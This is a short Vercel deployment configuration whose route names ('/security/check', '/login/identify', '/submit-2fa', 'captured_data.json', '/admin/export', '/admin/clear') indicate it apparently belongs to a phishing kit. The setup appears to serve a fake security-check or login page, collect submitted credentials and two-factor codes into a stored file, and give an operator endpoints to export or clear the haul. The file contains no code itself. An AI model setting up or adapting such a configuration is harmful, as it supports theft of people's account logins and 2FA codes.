{
  "version": 2,
  "buildCommand": null,
  "installCommand": "npm install",
  "cleanUrls": true,
  "trailingSlash": false,
  "functions": {
    "pages/api/*.js": {
      "includeFiles": "captured_data.json"
    }
  },
  "rewrites": [
    { "source": "/", "destination": "/index.html" },
    { "source": "/security", "destination": "/index.html" },
    { "source": "/security/check", "destination": "/index.html" },
    { "source": "/login/identify", "destination": "/index.html" },
    { "source": "/submit", "destination": "/api/submit" },
    { "source": "/submit-2fa", "destination": "/api/submit-2fa" },
    { "source": "/admin", "destination": "/api/admin" },
    { "source": "/admin/export", "destination": "/api/admin-export" },
    { "source": "/admin/clear", "destination": "/api/admin-clear" }
  ]
}
